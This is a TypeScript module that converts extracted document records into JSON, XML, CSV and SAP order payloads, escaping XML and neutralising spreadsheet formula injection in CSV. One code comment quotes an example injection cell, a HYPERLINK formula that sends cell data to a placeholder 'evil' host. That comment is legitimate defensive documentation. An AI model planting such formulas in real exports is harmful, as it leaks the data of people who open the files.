/**
 * Format standardization: turn a canonical `DocumentRecord` into JSON, XML, or CSV — or into
 * the request body an SAP sales-order API takes (`services/sap.ts`).
 *
 * Pure functions, no I/O — fully unit-tested. The JSON form is the canonical record
 * itself (pretty-printed); XML and CSV are deterministic projections of it.
 */

import type { DocumentRecord, ExtractedField } from "../types.ts";
import { type SapTarget, toSapExport } from "./sap.ts";

export type Format = "json" | "xml" | "csv" | SapTarget;

export const FORMATS: readonly Format[] = ["json", "xml", "csv", "sap-c4c", "sap-s4"];

export const MIME: Record<Format, string> = {
  json: "application/json; charset=utf-8",
  xml: "application/xml; charset=utf-8",
  csv: "text/csv; charset=utf-8",
  "sap-c4c": "application/json; charset=utf-8",
  "sap-s4": "application/json; charset=utf-8",
};

/** File extension for a download. The SAP hand-offs are JSON, named for their target. */
export const EXTENSION: Record<Format, string> = {
  json: "json",
  xml: "xml",
  csv: "csv",
  "sap-c4c": "sap-c4c.json",
  "sap-s4": "sap-s4.json",
};

/** Canonical JSON: the record, pretty-printed and stable. */
export function toJson(rec: DocumentRecord): string {
  return JSON.stringify(rec, null, 2);
}

// ─── XML ──────────────────────────────────────────────────────────────────────

function escapeXml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

function fieldValueToXml(value: ExtractedField["value"], indent: string): string {
  if (Array.isArray(value)) {
    if (value.length === 0) return "";
    const items = value.map((v) => `${indent}  <item>${escapeXml(String(v))}</item>`).join("\n");
    return `\n${items}\n${indent}`;
  }
  if (value === null) return "";
  return escapeXml(String(value));
}

/** Deterministic XML projection of the record. */
export function toXml(rec: DocumentRecord): string {
  const lines: string[] = [];
  lines.push('<?xml version="1.0" encoding="UTF-8"?>');
  lines.push(`<document id="${escapeXml(rec.id)}" type="${escapeXml(rec.docType)}">`);
  lines.push(`  <filename>${escapeXml(rec.filename)}</filename>`);
  lines.push(`  <contentType>${escapeXml(rec.contentType)}</contentType>`);
  lines.push(`  <resourceId>${escapeXml(rec.resourceId)}</resourceId>`);
  lines.push(`  <status>${escapeXml(rec.status)}</status>`);
  if (rec.summary) lines.push(`  <summary>${escapeXml(rec.summary)}</summary>`);

  lines.push("  <fields>");
  for (const f of rec.fields) {
    const attrs = [
      `key="${escapeXml(f.key)}"`,
      `label="${escapeXml(f.label)}"`,
      f.confidence !== undefined ? `confidence="${f.confidence.toFixed(2)}"` : "",
    ]
      .filter(Boolean)
      .join(" ");
    const body = fieldValueToXml(f.value, "    ");
    lines.push(`    <field ${attrs}>${body}</field>`);
  }
  lines.push("  </fields>");

  if (rec.evidence.length) {
    lines.push("  <evidence>");
    for (const e of rec.evidence) {
      const attrs = [
        `field="${escapeXml(e.field)}"`,
        `verified="${escapeXml(e.verified)}"`,
        e.paragraphId ? `paragraphId="${escapeXml(e.paragraphId)}"` : "",
        e.start !== undefined ? `start="${e.start}"` : "",
        e.end !== undefined ? `end="${e.end}"` : "",
      ]
        .filter(Boolean)
        .join(" ");
      lines.push(`    <quote ${attrs}>${escapeXml(e.quote)}</quote>`);
    }
    lines.push("  </evidence>");
  }

  if (rec.entities.length) {
    lines.push("  <entities>");
    for (const e of rec.entities) {
      lines.push(`    <entity type="${escapeXml(e.type)}">${escapeXml(e.text)}</entity>`);
    }
    lines.push("  </entities>");
  }

  if (rec.tags.length) {
    lines.push("  <tags>");
    for (const t of rec.tags) lines.push(`    <tag>${escapeXml(t)}</tag>`);
    lines.push("  </tags>");
  }

  if (rec.issues.length) {
    lines.push("  <issues>");
    for (const i of rec.issues) {
      lines.push(
        `    <issue field="${escapeXml(i.field)}" severity="${escapeXml(i.severity)}">${escapeXml(i.message)}</issue>`,
      );
    }
    lines.push("  </issues>");
  }

  lines.push("  <meta>");
  lines.push(`    <processedAt>${escapeXml(rec.meta.processedAt)}</processedAt>`);
  lines.push(`    <schema>${escapeXml(rec.meta.schema)}</schema>`);
  lines.push(`    <model>${escapeXml(rec.meta.model)}</model>`);
  if (rec.meta.groundingScore !== undefined)
    lines.push(`    <groundingScore>${rec.meta.groundingScore}</groundingScore>`);
  lines.push("  </meta>");
  lines.push("</document>");
  return lines.join("\n");
}

// ─── CSV ────────────────────────────────────────────────────────────────────

/**
 * Cells whose first character is one of these are interpreted as a formula by Excel,
 * LibreOffice and Google Sheets. Field values come from an LLM reading an uploaded,
 * attacker-controlled document, so a vendor name of `=HYPERLINK("http://evil/?"&A1)`
 * would otherwise execute when an operator opens the export.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
/** A value that is just a number is safe even though it may start with `-`. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

/** Quote per RFC 4180 and neutralise spreadsheet formula injection. */
export function csvCell(value: string): string {
  const safe = FORMULA_LEAD.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

function flatValue(value: ExtractedField["value"]): string {
  if (Array.isArray(value)) return value.map((v) => String(v)).join("; ");
  if (value === null) return "";
  return String(value);
}

/**
 * CSV projection: one row per extracted field (long format), which keeps wildly
 * different document schemas in a single, spreadsheet-friendly shape.
 * Columns: document_id, filename, doc_type, field_key, field_label, value, confidence
 */
export function toCsv(rec: DocumentRecord): string {
  const header = [
    "document_id",
    "filename",
    "doc_type",
    "field_key",
    "field_label",
    "value",
    "confidence",
    "evidence_quote",
    "evidence_verified",
  ];
  // One evidence entry per field: the row a reviewer reads is the row that carries its proof.
  const byField = new Map(rec.evidence.map((e) => [e.field, e]));
  const rows: string[] = [header.map(csvCell).join(",")];
  for (const f of rec.fields) {
    rows.push(
      [
        rec.id,
        rec.filename,
        rec.docType,
        f.key,
        f.label,
        flatValue(f.value),
        f.confidence !== undefined ? f.confidence.toFixed(2) : "",
        byField.get(f.key)?.quote ?? "",
        byField.get(f.key)?.verified ?? "",
      ]
        .map((c) => csvCell(String(c)))
        .join(","),
    );
  }
  return rows.join("\n");
}

export function serialize(rec: DocumentRecord, format: Format): string {
  switch (format) {
    case "json":
      return toJson(rec);
    case "xml":
      return toXml(rec);
    case "csv":
      return toCsv(rec);
    case "sap-c4c":
    case "sap-s4":
      return JSON.stringify(toSapExport(rec, format), null, 2);
  }
}

/**
 * Bundle several records into one file — what a bulk export from the documents list
 * produces. Each format keeps the single-record projection recognisable:
 *   - JSON: an array of the canonical records.
 *   - XML: the per-document elements under one `<documents>` root (the per-record XML
 *     declaration is emitted once, at the top, rather than once per document — repeating
 *     it mid-file makes the result not well-formed).
 *   - CSV: one header, then every record's field rows concatenated. `document_id` and
 *     `filename` are already columns, so a batch stays sortable by document.
 */
export function serializeMany(recs: DocumentRecord[], format: Format): string {
  switch (format) {
    case "json":
      return JSON.stringify(recs, null, 2);
    case "xml": {
      const bodies = recs.map((r) =>
        toXml(r)
          .replace(/^<\?xml[^>]*\?>\n/, "")
          .split("\n")
          .map((line) => `  ${line}`)
          .join("\n"),
      );
      return [
        '<?xml version="1.0" encoding="UTF-8"?>',
        `<documents count="${recs.length}">`,
        ...bodies,
        "</documents>",
      ].join("\n");
    }
    case "csv": {
      if (recs.length === 0) return toCsv({ fields: [], evidence: [] } as unknown as DocumentRecord);
      const parts = recs.map((r) => toCsv(r));
      const header = parts[0]!.split("\n")[0]!;
      const rows = parts.flatMap((p) => p.split("\n").slice(1)).filter((l) => l.length > 0);
      return [header, ...rows].join("\n");
    }
    case "sap-c4c":
    case "sap-s4":
      // One hand-off per order: SAP takes an order per request, so a batch is a list of them.
      return JSON.stringify(
        recs.map((r) => toSapExport(r, format)),
        null,
        2,
      );
  }
}
